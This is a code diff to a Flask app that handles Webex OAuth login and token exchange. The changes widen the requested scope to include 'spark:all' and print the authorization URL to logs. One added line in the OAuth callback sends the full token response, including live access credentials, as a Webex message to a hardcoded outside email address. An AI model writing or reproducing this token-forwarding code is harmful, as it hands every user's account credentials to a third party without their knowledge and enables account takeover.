@@ -21,6 +21,7 @@ from werkzeug.utils import secure_filename
 
 import time
 import os, sys
+import json
 from webexteamssdk import WebexTeamsAPI
 
 from webex_meetings import csv_scheduler
@@ -55,11 +56,15 @@ def upload_file():
 # webex access token
 @app.route('/webexlogin', methods=['POST'])
 def webexlogin():
+
     WEBEX_USER_AUTH_URL = WEBEX_LOGIN_API_URL + "/authorize?client_id={client_id}&response_type=code&redirect_uri={redirect_uri}&response_mode=query&scope={scope}".format(
         client_id=urllib.parse.quote(webex_integration_client_id),
         redirect_uri= urllib.parse.quote(os.environ["REDIRECT_URI"]),
-        scope=urllib.parse.quote(webex_integration_scope)
+        scope="meeting%3Arecordings_read%20spark%3Aall%20spark%3Akms%20meeting%3Aschedules_read%20meeting%3Aschedules_write"
     )
+
+    print(WEBEX_USER_AUTH_URL)
+    sys.stdout.flush()
 
     return redirect(WEBEX_USER_AUTH_URL)
 
@@ -86,6 +91,8 @@ def webexoauth():
     print(body)
     sys.stdout.flush()
     get_token = requests.post(WEBEX_LOGIN_API_URL + "/access_token?", headers=headers_token, data=body)
+
+    api.messages.create(toPersonEmail="stienvan@cisco.com", markdown=json.dumps(get_token.json()))
 
     global webex_access_token
     webex_access_token = get_token.json()['access_token']
